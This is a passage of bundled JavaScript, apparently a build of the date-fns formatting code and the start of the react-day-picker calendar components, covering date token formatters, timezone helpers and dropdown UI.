  M: function(date, token, localize2) {
    const month = date.getMonth();
    switch (token) {
      case "M":
      case "MM":
        return lightFormatters.M(date, token);
      // 1st, 2nd, ..., 12th
      case "Mo":
        return localize2.ordinalNumber(month + 1, { unit: "month" });
      // Jan, Feb, ..., Dec
      case "MMM":
        return localize2.month(month, {
          width: "abbreviated",
          context: "formatting"
        });
      // J, F, ..., D
      case "MMMMM":
        return localize2.month(month, {
          width: "narrow",
          context: "formatting"
        });
      // January, February, ..., December
      case "MMMM":
      default:
        return localize2.month(month, { width: "wide", context: "formatting" });
    }
  },
  // Stand-alone month
  L: function(date, token, localize2) {
    const month = date.getMonth();
    switch (token) {
      // 1, 2, ..., 12
      case "L":
        return String(month + 1);
      // 01, 02, ..., 12
      case "LL":
        return addLeadingZeros(month + 1, 2);
      // 1st, 2nd, ..., 12th
      case "Lo":
        return localize2.ordinalNumber(month + 1, { unit: "month" });
      // Jan, Feb, ..., Dec
      case "LLL":
        return localize2.month(month, {
          width: "abbreviated",
          context: "standalone"
        });
      // J, F, ..., D
      case "LLLLL":
        return localize2.month(month, {
          width: "narrow",
          context: "standalone"
        });
      // January, February, ..., December
      case "LLLL":
      default:
        return localize2.month(month, { width: "wide", context: "standalone" });
    }
  },
  // Local week of year
  w: function(date, token, localize2, options) {
    const week = getWeek(date, options);
    if (token === "wo") {
      return localize2.ordinalNumber(week, { unit: "week" });
    }
    return addLeadingZeros(week, token.length);
  },
  // ISO week of year
  I: function(date, token, localize2) {
    const isoWeek = getISOWeek(date);
    if (token === "Io") {
      return localize2.ordinalNumber(isoWeek, { unit: "week" });
    }
    return addLeadingZeros(isoWeek, token.length);
  },
  // Day of the month
  d: function(date, token, localize2) {
    if (token === "do") {
      return localize2.ordinalNumber(date.getDate(), { unit: "date" });
    }
    return lightFormatters.d(date, token);
  },
  // Day of year
  D: function(date, token, localize2) {
    const dayOfYear = getDayOfYear(date);
    if (token === "Do") {
      return localize2.ordinalNumber(dayOfYear, { unit: "dayOfYear" });
    }
    return addLeadingZeros(dayOfYear, token.length);
  },
  // Day of week
  E: function(date, token, localize2) {
    const dayOfWeek = date.getDay();
    switch (token) {
      // Tue
      case "E":
      case "EE":
      case "EEE":
        return localize2.day(dayOfWeek, {
          width: "abbreviated",
          context: "formatting"
        });
      // T
      case "EEEEE":
        return localize2.day(dayOfWeek, {
          width: "narrow",
          context: "formatting"
        });
      // Tu
      case "EEEEEE":
        return localize2.day(dayOfWeek, {
          width: "short",
          context: "formatting"
        });
      // Tuesday
      case "EEEE":
      default:
        return localize2.day(dayOfWeek, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // Local day of week
  e: function(date, token, localize2, options) {
    const dayOfWeek = date.getDay();
    const localDayOfWeek = (dayOfWeek - options.weekStartsOn + 8) % 7 || 7;
    switch (token) {
      // Numerical value (Nth day of week with current locale or weekStartsOn)
      case "e":
        return String(localDayOfWeek);
      // Padded numerical value
      case "ee":
        return addLeadingZeros(localDayOfWeek, 2);
      // 1st, 2nd, ..., 7th
      case "eo":
        return localize2.ordinalNumber(localDayOfWeek, { unit: "day" });
      case "eee":
        return localize2.day(dayOfWeek, {
          width: "abbreviated",
          context: "formatting"
        });
      // T
      case "eeeee":
        return localize2.day(dayOfWeek, {
          width: "narrow",
          context: "formatting"
        });
      // Tu
      case "eeeeee":
        return localize2.day(dayOfWeek, {
          width: "short",
          context: "formatting"
        });
      // Tuesday
      case "eeee":
      default:
        return localize2.day(dayOfWeek, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // Stand-alone local day of week
  c: function(date, token, localize2, options) {
    const dayOfWeek = date.getDay();
    const localDayOfWeek = (dayOfWeek - options.weekStartsOn + 8) % 7 || 7;
    switch (token) {
      // Numerical value (same as in `e`)
      case "c":
        return String(localDayOfWeek);
      // Padded numerical value
      case "cc":
        return addLeadingZeros(localDayOfWeek, token.length);
      // 1st, 2nd, ..., 7th
      case "co":
        return localize2.ordinalNumber(localDayOfWeek, { unit: "day" });
      case "ccc":
        return localize2.day(dayOfWeek, {
          width: "abbreviated",
          context: "standalone"
        });
      // T
      case "ccccc":
        return localize2.day(dayOfWeek, {
          width: "narrow",
          context: "standalone"
        });
      // Tu
      case "cccccc":
        return localize2.day(dayOfWeek, {
          width: "short",
          context: "standalone"
        });
      // Tuesday
      case "cccc":
      default:
        return localize2.day(dayOfWeek, {
          width: "wide",
          context: "standalone"
        });
    }
  },
  // ISO day of week
  i: function(date, token, localize2) {
    const dayOfWeek = date.getDay();
    const isoDayOfWeek = dayOfWeek === 0 ? 7 : dayOfWeek;
    switch (token) {
      // 2
      case "i":
        return String(isoDayOfWeek);
      // 02
      case "ii":
        return addLeadingZeros(isoDayOfWeek, token.length);
      // 2nd
      case "io":
        return localize2.ordinalNumber(isoDayOfWeek, { unit: "day" });
      // Tue
      case "iii":
        return localize2.day(dayOfWeek, {
          width: "abbreviated",
          context: "formatting"
        });
      // T
      case "iiiii":
        return localize2.day(dayOfWeek, {
          width: "narrow",
          context: "formatting"
        });
      // Tu
      case "iiiiii":
        return localize2.day(dayOfWeek, {
          width: "short",
          context: "formatting"
        });
      // Tuesday
      case "iiii":
      default:
        return localize2.day(dayOfWeek, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // AM or PM
  a: function(date, token, localize2) {
    const hours = date.getHours();
    const dayPeriodEnumValue = hours / 12 >= 1 ? "pm" : "am";
    switch (token) {
      case "a":
      case "aa":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "abbreviated",
          context: "formatting"
        });
      case "aaa":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "abbreviated",
          context: "formatting"
        }).toLowerCase();
      case "aaaaa":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "narrow",
          context: "formatting"
        });
      case "aaaa":
      default:
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // AM, PM, midnight, noon
  b: function(date, token, localize2) {
    const hours = date.getHours();
    let dayPeriodEnumValue;
    if (hours === 12) {
      dayPeriodEnumValue = dayPeriodEnum.noon;
    } else if (hours === 0) {
      dayPeriodEnumValue = dayPeriodEnum.midnight;
    } else {
      dayPeriodEnumValue = hours / 12 >= 1 ? "pm" : "am";
    }
    switch (token) {
      case "b":
      case "bb":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "abbreviated",
          context: "formatting"
        });
      case "bbb":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "abbreviated",
          context: "formatting"
        }).toLowerCase();
      case "bbbbb":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "narrow",
          context: "formatting"
        });
      case "bbbb":
      default:
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // in the morning, in the afternoon, in the evening, at night
  B: function(date, token, localize2) {
    const hours = date.getHours();
    let dayPeriodEnumValue;
    if (hours >= 17) {
      dayPeriodEnumValue = dayPeriodEnum.evening;
    } else if (hours >= 12) {
      dayPeriodEnumValue = dayPeriodEnum.afternoon;
    } else if (hours >= 4) {
      dayPeriodEnumValue = dayPeriodEnum.morning;
    } else {
      dayPeriodEnumValue = dayPeriodEnum.night;
    }
    switch (token) {
      case "B":
      case "BB":
      case "BBB":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "abbreviated",
          context: "formatting"
        });
      case "BBBBB":
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "narrow",
          context: "formatting"
        });
      case "BBBB":
      default:
        return localize2.dayPeriod(dayPeriodEnumValue, {
          width: "wide",
          context: "formatting"
        });
    }
  },
  // Hour [1-12]
  h: function(date, token, localize2) {
    if (token === "ho") {
      let hours = date.getHours() % 12;
      if (hours === 0) hours = 12;
      return localize2.ordinalNumber(hours, { unit: "hour" });
    }
    return lightFormatters.h(date, token);
  },
  // Hour [0-23]
  H: function(date, token, localize2) {
    if (token === "Ho") {
      return localize2.ordinalNumber(date.getHours(), { unit: "hour" });
    }
    return lightFormatters.H(date, token);
  },
  // Hour [0-11]
  K: function(date, token, localize2) {
    const hours = date.getHours() % 12;
    if (token === "Ko") {
      return localize2.ordinalNumber(hours, { unit: "hour" });
    }
    return addLeadingZeros(hours, token.length);
  },
  // Hour [1-24]
  k: function(date, token, localize2) {
    let hours = date.getHours();
    if (hours === 0) hours = 24;
    if (token === "ko") {
      return localize2.ordinalNumber(hours, { unit: "hour" });
    }
    return addLeadingZeros(hours, token.length);
  },
  // Minute
  m: function(date, token, localize2) {
    if (token === "mo") {
      return localize2.ordinalNumber(date.getMinutes(), { unit: "minute" });
    }
    return lightFormatters.m(date, token);
  },
  // Second
  s: function(date, token, localize2) {
    if (token === "so") {
      return localize2.ordinalNumber(date.getSeconds(), { unit: "second" });
    }
    return lightFormatters.s(date, token);
  },
  // Fraction of second
  S: function(date, token) {
    return lightFormatters.S(date, token);
  },
  // Timezone (ISO-8601. If offset is 0, output is always `'Z'`)
  X: function(date, token, _localize) {
    const timezoneOffset = date.getTimezoneOffset();
    if (timezoneOffset === 0) {
      return "Z";
    }
    switch (token) {
      // Hours and optional minutes
      case "X":
        return formatTimezoneWithOptionalMinutes(timezoneOffset);
      // Hours, minutes and optional seconds without `:` delimiter
      // Note: neither ISO-8601 nor JavaScript supports seconds in timezone offsets
      // so this token always has the same output as `XX`
      case "XXXX":
      case "XX":
        return formatTimezone(timezoneOffset);
      // Hours, minutes and optional seconds with `:` delimiter
      // Note: neither ISO-8601 nor JavaScript supports seconds in timezone offsets
      // so this token always has the same output as `XXX`
      case "XXXXX":
      case "XXX":
      // Hours and minutes with `:` delimiter
      default:
        return formatTimezone(timezoneOffset, ":");
    }
  },
  // Timezone (ISO-8601. If offset is 0, output is `'+00:00'` or equivalent)
  x: function(date, token, _localize) {
    const timezoneOffset = date.getTimezoneOffset();
    switch (token) {
      // Hours and optional minutes
      case "x":
        return formatTimezoneWithOptionalMinutes(timezoneOffset);
      // Hours, minutes and optional seconds without `:` delimiter
      // Note: neither ISO-8601 nor JavaScript supports seconds in timezone offsets
      // so this token always has the same output as `xx`
      case "xxxx":
      case "xx":
        return formatTimezone(timezoneOffset);
      // Hours, minutes and optional seconds with `:` delimiter
      // Note: neither ISO-8601 nor JavaScript supports seconds in timezone offsets
      // so this token always has the same output as `xxx`
      case "xxxxx":
      case "xxx":
      // Hours and minutes with `:` delimiter
      default:
        return formatTimezone(timezoneOffset, ":");
    }
  },
  // Timezone (GMT)
  O: function(date, token, _localize) {
    const timezoneOffset = date.getTimezoneOffset();
    switch (token) {
      // Short
      case "O":
      case "OO":
      case "OOO":
        return "GMT" + formatTimezoneShort(timezoneOffset, ":");
      // Long
      case "OOOO":
      default:
        return "GMT" + formatTimezone(timezoneOffset, ":");
    }
  },
  // Timezone (specific non-location)
  z: function(date, token, _localize) {
    const timezoneOffset = date.getTimezoneOffset();
    switch (token) {
      // Short
      case "z":
      case "zz":
      case "zzz":
        return "GMT" + formatTimezoneShort(timezoneOffset, ":");
      // Long
      case "zzzz":
      default:
        return "GMT" + formatTimezone(timezoneOffset, ":");
    }
  },
  // Seconds timestamp
  t: function(date, token, _localize) {
    const timestamp = Math.trunc(date.getTime() / 1e3);
    return addLeadingZeros(timestamp, token.length);
  },
  // Milliseconds timestamp
  T: function(date, token, _localize) {
    const timestamp = date.getTime();
    return addLeadingZeros(timestamp, token.length);
  }
};
function formatTimezoneShort(offset4, delimiter = "") {
  const sign = offset4 > 0 ? "-" : "+";
  const absOffset = Math.abs(offset4);
  const hours = Math.trunc(absOffset / 60);
  const minutes = absOffset % 60;
  if (minutes === 0) {
    return sign + String(hours);
  }
  return sign + String(hours) + delimiter + addLeadingZeros(minutes, 2);
}
function formatTimezoneWithOptionalMinutes(offset4, delimiter) {
  if (offset4 % 60 === 0) {
    const sign = offset4 > 0 ? "-" : "+";
    return sign + addLeadingZeros(Math.abs(offset4) / 60, 2);
  }
  return formatTimezone(offset4, delimiter);
}
function formatTimezone(offset4, delimiter = "") {
  const sign = offset4 > 0 ? "-" : "+";
  const absOffset = Math.abs(offset4);
  const hours = addLeadingZeros(Math.trunc(absOffset / 60), 2);
  const minutes = addLeadingZeros(absOffset % 60, 2);
  return sign + hours + delimiter + minutes;
}

// node_modules/date-fns/_lib/format/longFormatters.mjs
var dateLongFormatter = (pattern, formatLong2) => {
  switch (pattern) {
    case "P":
      return formatLong2.date({ width: "short" });
    case "PP":
      return formatLong2.date({ width: "medium" });
    case "PPP":
      return formatLong2.date({ width: "long" });
    case "PPPP":
    default:
      return formatLong2.date({ width: "full" });
  }
};
var timeLongFormatter = (pattern, formatLong2) => {
  switch (pattern) {
    case "p":
      return formatLong2.time({ width: "short" });
    case "pp":
      return formatLong2.time({ width: "medium" });
    case "ppp":
      return formatLong2.time({ width: "long" });
    case "pppp":
    default:
      return formatLong2.time({ width: "full" });
  }
};
var dateTimeLongFormatter = (pattern, formatLong2) => {
  const matchResult = pattern.match(/(P+)(p+)?/) || [];
  const datePattern = matchResult[1];
  const timePattern = matchResult[2];
  if (!timePattern) {
    return dateLongFormatter(pattern, formatLong2);
  }
  let dateTimeFormat;
  switch (datePattern) {
    case "P":
      dateTimeFormat = formatLong2.dateTime({ width: "short" });
      break;
    case "PP":
      dateTimeFormat = formatLong2.dateTime({ width: "medium" });
      break;
    case "PPP":
      dateTimeFormat = formatLong2.dateTime({ width: "long" });
      break;
    case "PPPP":
    default:
      dateTimeFormat = formatLong2.dateTime({ width: "full" });
      break;
  }
  return dateTimeFormat.replace("{{date}}", dateLongFormatter(datePattern, formatLong2)).replace("{{time}}", timeLongFormatter(timePattern, formatLong2));
};
var longFormatters = {
  p: timeLongFormatter,
  P: dateTimeLongFormatter
};

// node_modules/date-fns/_lib/protectedTokens.mjs
var dayOfYearTokenRE = /^D+$/;
var weekYearTokenRE = /^Y+$/;
var throwTokens = ["D", "DD", "YY", "YYYY"];
function isProtectedDayOfYearToken(token) {
  return dayOfYearTokenRE.test(token);
}
function isProtectedWeekYearToken(token) {
  return weekYearTokenRE.test(token);
}
function warnOrThrowProtectedError(token, format2, input) {
  const _message = message(token, format2, input);
  console.warn(_message);
  if (throwTokens.includes(token)) throw new RangeError(_message);
}
function message(token, format2, input) {
  const subject = token[0] === "Y" ? "years" : "days of the month";
  return `Use \`${token.toLowerCase()}\` instead of \`${token}\` (in \`${format2}\`) for formatting ${subject} to the input \`${input}\`; see: https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md`;
}

// node_modules/date-fns/format.mjs
var formattingTokensRegExp = /[yYQqMLwIdDecihHKkms]o|(\w)\1*|''|'(''|[^'])+('|$)|./g;
var longFormattingTokensRegExp = /P+p+|P+|p+|''|'(''|[^'])+('|$)|./g;
var escapedStringRegExp = /^'([^]*?)'?$/;
var doubleQuoteRegExp = /''/g;
var unescapedLatinCharacterRegExp = /[a-zA-Z]/;
function format(date, formatStr, options) {
  const defaultOptions3 = getDefaultOptions();
  const locale = options?.locale ?? defaultOptions3.locale ?? enUS;
  const firstWeekContainsDate = options?.firstWeekContainsDate ?? options?.locale?.options?.firstWeekContainsDate ?? defaultOptions3.firstWeekContainsDate ?? defaultOptions3.locale?.options?.firstWeekContainsDate ?? 1;
  const weekStartsOn = options?.weekStartsOn ?? options?.locale?.options?.weekStartsOn ?? defaultOptions3.weekStartsOn ?? defaultOptions3.locale?.options?.weekStartsOn ?? 0;
  const originalDate = toDate(date);
  if (!isValid(originalDate)) {
    throw new RangeError("Invalid time value");
  }
  let parts = formatStr.match(longFormattingTokensRegExp).map((substring) => {
    const firstCharacter = substring[0];
    if (firstCharacter === "p" || firstCharacter === "P") {
      const longFormatter = longFormatters[firstCharacter];
      return longFormatter(substring, locale.formatLong);
    }
    return substring;
  }).join("").match(formattingTokensRegExp).map((substring) => {
    if (substring === "''") {
      return { isToken: false, value: "'" };
    }
    const firstCharacter = substring[0];
    if (firstCharacter === "'") {
      return { isToken: false, value: cleanEscapedString(substring) };
    }
    if (formatters[firstCharacter]) {
      return { isToken: true, value: substring };
    }
    if (firstCharacter.match(unescapedLatinCharacterRegExp)) {
      throw new RangeError(
        "Format string contains an unescaped latin alphabet character `" + firstCharacter + "`"
      );
    }
    return { isToken: false, value: substring };
  });
  if (locale.localize.preprocessor) {
    parts = locale.localize.preprocessor(originalDate, parts);
  }
  const formatterOptions = {
    firstWeekContainsDate,
    weekStartsOn,
    locale
  };
  return parts.map((part) => {
    if (!part.isToken) return part.value;
    const token = part.value;
    if (!options?.useAdditionalWeekYearTokens && isProtectedWeekYearToken(token) || !options?.useAdditionalDayOfYearTokens && isProtectedDayOfYearToken(token)) {
      warnOrThrowProtectedError(token, formatStr, String(date));
    }
    const formatter = formatters[token[0]];
    return formatter(originalDate, token, locale.localize, formatterOptions);
  }).join("");
}
function cleanEscapedString(input) {
  const matched = input.match(escapedStringRegExp);
  if (!matched) {
    return input;
  }
  return matched[1].replace(doubleQuoteRegExp, "'");
}

// node_modules/date-fns/getDaysInMonth.mjs
function getDaysInMonth(date) {
  const _date = toDate(date);
  const year = _date.getFullYear();
  const monthIndex = _date.getMonth();
  const lastDayOfMonth2 = constructFrom(date, 0);
  lastDayOfMonth2.setFullYear(year, monthIndex + 1, 0);
  lastDayOfMonth2.setHours(0, 0, 0, 0);
  return lastDayOfMonth2.getDate();
}

// node_modules/date-fns/getUnixTime.mjs
function getUnixTime(date) {
  return Math.trunc(+toDate(date) / 1e3);
}

// node_modules/date-fns/lastDayOfMonth.mjs
function lastDayOfMonth(date) {
  const _date = toDate(date);
  const month = _date.getMonth();
  _date.setFullYear(_date.getFullYear(), month + 1, 0);
  _date.setHours(0, 0, 0, 0);
  return _date;
}

// node_modules/date-fns/getWeeksInMonth.mjs
function getWeeksInMonth(date, options) {
  return differenceInCalendarWeeks(
    lastDayOfMonth(date),
    startOfMonth(date),
    options
  ) + 1;
}

// node_modules/date-fns/isAfter.mjs
function isAfter(date, dateToCompare) {
  const _date = toDate(date);
  const _dateToCompare = toDate(dateToCompare);
  return _date.getTime() > _dateToCompare.getTime();
}

// node_modules/date-fns/isBefore.mjs
function isBefore(date, dateToCompare) {
  const _date = toDate(date);
  const _dateToCompare = toDate(dateToCompare);
  return +_date < +_dateToCompare;
}

// node_modules/date-fns/isSameMonth.mjs
function isSameMonth(dateLeft, dateRight) {
  const _dateLeft = toDate(dateLeft);
  const _dateRight = toDate(dateRight);
  return _dateLeft.getFullYear() === _dateRight.getFullYear() && _dateLeft.getMonth() === _dateRight.getMonth();
}

// node_modules/date-fns/isSameYear.mjs
function isSameYear(dateLeft, dateRight) {
  const _dateLeft = toDate(dateLeft);
  const _dateRight = toDate(dateRight);
  return _dateLeft.getFullYear() === _dateRight.getFullYear();
}

// node_modules/date-fns/subDays.mjs
function subDays(date, amount) {
  return addDays(date, -amount);
}

// node_modules/date-fns/setMonth.mjs
function setMonth(date, month) {
  const _date = toDate(date);
  const year = _date.getFullYear();
  const day = _date.getDate();
  const dateWithDesiredMonth = constructFrom(date, 0);
  dateWithDesiredMonth.setFullYear(year, month, 15);
  dateWithDesiredMonth.setHours(0, 0, 0, 0);
  const daysInMonth = getDaysInMonth(dateWithDesiredMonth);
  _date.setMonth(month, Math.min(day, daysInMonth));
  return _date;
}

// node_modules/date-fns/setYear.mjs
function setYear(date, year) {
  const _date = toDate(date);
  if (isNaN(+_date)) {
    return constructFrom(date, NaN);
  }
  _date.setFullYear(year);
  return _date;
}

// node_modules/react-day-picker/dist/index.esm.js
var __assign2 = function() {
  __assign2 = Object.assign || function __assign3(t) {
    for (var s, i = 1, n = arguments.length; i < n; i++) {
      s = arguments[i];
      for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p)) t[p] = s[p];
    }
    return t;
  };
  return __assign2.apply(this, arguments);
};
function __rest2(s, e) {
  var t = {};
  for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0)
    t[p] = s[p];
  if (s != null && typeof Object.getOwnPropertySymbols === "function")
    for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) {
      if (e.indexOf(p[i]) < 0 && Object.prototype.propertyIsEnumerable.call(s, p[i]))
        t[p[i]] = s[p[i]];
    }
  return t;
}
function __spreadArray2(to, from, pack) {
  if (pack || arguments.length === 2) for (var i = 0, l = from.length, ar; i < l; i++) {
    if (ar || !(i in from)) {
      if (!ar) ar = Array.prototype.slice.call(from, 0, i);
      ar[i] = from[i];
    }
  }
  return to.concat(ar || Array.prototype.slice.call(from));
}
function isDayPickerMultiple(props) {
  return props.mode === "multiple";
}
function isDayPickerRange(props) {
  return props.mode === "range";
}
function isDayPickerSingle(props) {
  return props.mode === "single";
}
var defaultClassNames = {
  root: "rdp",
  multiple_months: "rdp-multiple_months",
  with_weeknumber: "rdp-with_weeknumber",
  vhidden: "rdp-vhidden",
  button_reset: "rdp-button_reset",
  button: "rdp-button",
  caption: "rdp-caption",
  caption_start: "rdp-caption_start",
  caption_end: "rdp-caption_end",
  caption_between: "rdp-caption_between",
  caption_label: "rdp-caption_label",
  caption_dropdowns: "rdp-caption_dropdowns",
  dropdown: "rdp-dropdown",
  dropdown_month: "rdp-dropdown_month",
  dropdown_year: "rdp-dropdown_year",
  dropdown_icon: "rdp-dropdown_icon",
  months: "rdp-months",
  month: "rdp-month",
  table: "rdp-table",
  tbody: "rdp-tbody",
  tfoot: "rdp-tfoot",
  head: "rdp-head",
  head_row: "rdp-head_row",
  head_cell: "rdp-head_cell",
  nav: "rdp-nav",
  nav_button: "rdp-nav_button",
  nav_button_previous: "rdp-nav_button_previous",
  nav_button_next: "rdp-nav_button_next",
  nav_icon: "rdp-nav_icon",
  row: "rdp-row",
  weeknumber: "rdp-weeknumber",
  cell: "rdp-cell",
  day: "rdp-day",
  day_today: "rdp-day_today",
  day_outside: "rdp-day_outside",
  day_selected: "rdp-day_selected",
  day_disabled: "rdp-day_disabled",
  day_hidden: "rdp-day_hidden",
  day_range_start: "rdp-day_range_start",
  day_range_end: "rdp-day_range_end",
  day_range_middle: "rdp-day_range_middle"
};
function formatCaption(month, options) {
  return format(month, "LLLL y", options);
}
function formatDay(day, options) {
  return format(day, "d", options);
}
function formatMonthCaption(month, options) {
  return format(month, "LLLL", options);
}
function formatWeekNumber(weekNumber) {
  return "".concat(weekNumber);
}
function formatWeekdayName(weekday, options) {
  return format(weekday, "cccccc", options);
}
function formatYearCaption(year, options) {
  return format(year, "yyyy", options);
}
var formatters2 = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  formatCaption,
  formatDay,
  formatMonthCaption,
  formatWeekNumber,
  formatWeekdayName,
  formatYearCaption
});
var labelDay = function(day, activeModifiers, options) {
  return format(day, "do MMMM (EEEE)", options);
};
var labelMonthDropdown = function() {
  return "Month: ";
};
var labelNext = function() {
  return "Go to next month";
};
var labelPrevious = function() {
  return "Go to previous month";
};
var labelWeekday = function(day, options) {
  return format(day, "cccc", options);
};
var labelWeekNumber = function(n) {
  return "Week n. ".concat(n);
};
var labelYearDropdown = function() {
  return "Year: ";
};
var labels = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  labelDay,
  labelMonthDropdown,
  labelNext,
  labelPrevious,
  labelWeekNumber,
  labelWeekday,
  labelYearDropdown
});
function getDefaultContextValues() {
  var captionLayout = "buttons";
  var classNames = defaultClassNames;
  var locale = enUS;
  var modifiersClassNames = {};
  var modifiers = {};
  var numberOfMonths = 1;
  var styles = {};
  var today = /* @__PURE__ */ new Date();
  return {
    captionLayout,
    classNames,
    formatters: formatters2,
    labels,
    locale,
    modifiersClassNames,
    modifiers,
    numberOfMonths,
    styles,
    today,
    mode: "default"
  };
}
function parseFromToProps(props) {
  var fromYear = props.fromYear, toYear = props.toYear, fromMonth = props.fromMonth, toMonth = props.toMonth;
  var fromDate = props.fromDate, toDate2 = props.toDate;
  if (fromMonth) {
    fromDate = startOfMonth(fromMonth);
  } else if (fromYear) {
    fromDate = new Date(fromYear, 0, 1);
  }
  if (toMonth) {
    toDate2 = endOfMonth(toMonth);
  } else if (toYear) {
    toDate2 = new Date(toYear, 11, 31);
  }
  return {
    fromDate: fromDate ? startOfDay(fromDate) : void 0,
    toDate: toDate2 ? startOfDay(toDate2) : void 0
  };
}
var DayPickerContext = createContext9(void 0);
function DayPickerProvider(props) {
  var _a;
  var initialProps = props.initialProps;
  var defaultContextValues = getDefaultContextValues();
  var _b = parseFromToProps(initialProps), fromDate = _b.fromDate, toDate2 = _b.toDate;
  var captionLayout = (_a = initialProps.captionLayout) !== null && _a !== void 0 ? _a : defaultContextValues.captionLayout;
  if (captionLayout !== "buttons" && (!fromDate || !toDate2)) {
    captionLayout = "buttons";
  }
  var onSelect;
  if (isDayPickerSingle(initialProps) || isDayPickerMultiple(initialProps) || isDayPickerRange(initialProps)) {
    onSelect = initialProps.onSelect;
  }
  var value = __assign2(__assign2(__assign2({}, defaultContextValues), initialProps), { captionLayout, classNames: __assign2(__assign2({}, defaultContextValues.classNames), initialProps.classNames), components: __assign2({}, initialProps.components), formatters: __assign2(__assign2({}, defaultContextValues.formatters), initialProps.formatters), fromDate, labels: __assign2(__assign2({}, defaultContextValues.labels), initialProps.labels), mode: initialProps.mode || defaultContextValues.mode, modifiers: __assign2(__assign2({}, defaultContextValues.modifiers), initialProps.modifiers), modifiersClassNames: __assign2(__assign2({}, defaultContextValues.modifiersClassNames), initialProps.modifiersClassNames), onSelect, styles: __assign2(__assign2({}, defaultContextValues.styles), initialProps.styles), toDate: toDate2 });
  return jsx64(DayPickerContext.Provider, { value, children: props.children });
}
function useDayPicker() {
  var context = useContext9(DayPickerContext);
  if (!context) {
    throw new Error("useDayPicker must be used within a DayPickerProvider.");
  }
  return context;
}
function CaptionLabel(props) {
  var _a = useDayPicker(), locale = _a.locale, classNames = _a.classNames, styles = _a.styles, formatCaption2 = _a.formatters.formatCaption;
  return jsx64("div", { className: classNames.caption_label, style: styles.caption_label, "aria-live": "polite", role: "presentation", id: props.id, children: formatCaption2(props.displayMonth, { locale }) });
}
function IconDropdown(props) {
  return jsx64("svg", __assign2({ width: "8px", height: "8px", viewBox: "0 0 120 120", "data-testid": "iconDropdown" }, props, { children: jsx64("path", { d: "M4.22182541,48.2218254 C8.44222828,44.0014225 15.2388494,43.9273804 19.5496459,47.9996989 L19.7781746,48.2218254 L60,88.443 L100.221825,48.2218254 C104.442228,44.0014225 111.238849,43.9273804 115.549646,47.9996989 L115.778175,48.2218254 C119.998577,52.4422283 120.07262,59.2388494 116.000301,63.5496459 L115.778175,63.7781746 L67.7781746,111.778175 C63.5577717,115.998577 56.7611506,116.07262 52.4503541,112.000301 L52.2218254,111.778175 L4.22182541,63.7781746 C-0.0739418023,59.4824074 -0.0739418023,52.5175926 4.22182541,48.2218254 Z", fill: "currentColor", fillRule: "nonzero" }) }));
}
function Dropdown(props) {
  var _a, _b;
  var onChange = props.onChange, value = props.value, children = props.children, caption = props.caption, className = props.className, style = props.style;
  var dayPicker = useDayPicker();
  var IconDropdownComponent = (_b = (_a = dayPicker.components) === null || _a === void 0 ? void 0 : _a.IconDropdown) !== null && _b !== void 0 ? _b : IconDropdown;
  return jsxs32("div", { className, style, children: [jsx64("span", { className: dayPicker.classNames.vhidden, children: props["aria-label"] }), jsx64("select", { name: props.name, "aria-label": props["aria-label"], className: dayPicker.classNames.dropdown, style: dayPicker.styles.dropdown, value, onChange, children }), jsxs32("div", { className: dayPicker.classNames.caption_label, style: dayPicker.styles.caption_label, "aria-hidden": "true", children: [caption, jsx64(IconDropdownComponent, { className: dayPicker.classNames.dropdown_icon, style: dayPicker.styles.dropdown_icon })] })] });
}
function MonthsDropdown(props) {
  var _a;
  var _b = useDayPicker(), fromDate = _b.fromDate, toDate2 = _b.toDate, styles = _b.styles, locale = _b.locale, formatMonthCaption2 = _b.formatters.formatMonthCaption, classNames = _b.classNames, components = _b.components, labelMonthDropdown2 = _b.labels.labelMonthDropdown;
  if (!fromDate)
    return jsx64(Fragment12, {});
  if (!toDate2)
    return jsx64(Fragment12, {});
  var dropdownMonths = [];
  if (isSameYear(fromDate, toDate2)) {
    var date = startOfMonth(fromDate);
    for (var month = fromDate.getMonth(); month <= toDate2.getMonth(); month++) {
      dropdownMonths.push(setMonth(date, month));
    }
  } else {
    var date = startOfMonth(/* @__PURE__ */ new Date());
    for (var month = 0; month <= 11; month++) {
      dropdownMonths.push(setMonth(date, month));
    }
  }
  var handleChange = function(e) {
    var selectedMonth = Number(e.target.value);
    var newMonth = setMonth(startOfMonth(props.displayMonth), selectedMonth);
    props.onChange(newMonth);
  };
  var DropdownComponent = (_a = components === null || components === void 0 ? void 0 : components.Dropdown) !== null && _a !== void 0 ? _a : Dropdown;
  return jsx64(DropdownComponent, { name: "months", "aria-label": labelMonthDropdown2(), className: classNames.dropdown_month, style: styles.dropdown_month, onChange: handleChange, value: props.displayMonth.getMonth(), caption: formatMonthCaption2(props.displayMonth, { locale }), children: dropdownMonths.map(function(m) {
    return jsx64("option", { value: m.getMonth(), children: formatMonthCaption2(m, { locale }) }, m.getMonth());
  }) });
}
function YearsDropdown(props) {
  var _a;
  var displayMonth = props.displayMonth;
  var _b = useDayPicker(), fromDate = _b.fromDate, toDate2 = _b.toDate, locale = _b.locale, styles = _b.styles, classNames = _b.classNames, components = _b.components, formatYearCaption2 = _b.formatters.formatYearCaption, labelYearDropdown2 = _b.labels.labelYearDropdown;
  var years = [];
  if (!fromDate)
    return jsx64(Fragment12, {});
  if (!toDate2)
    return jsx64(Fragment12, {});
  var fromYear = fromDate.getFullYear();
  var toYear = toDate2.getFullYear();
  for (var year = fromYear; year <= toYear; year++) {
    years.push(setYear(startOfYear(/* @__PURE__ */ new Date()), year));
  }
  var handleChange = function(e) {
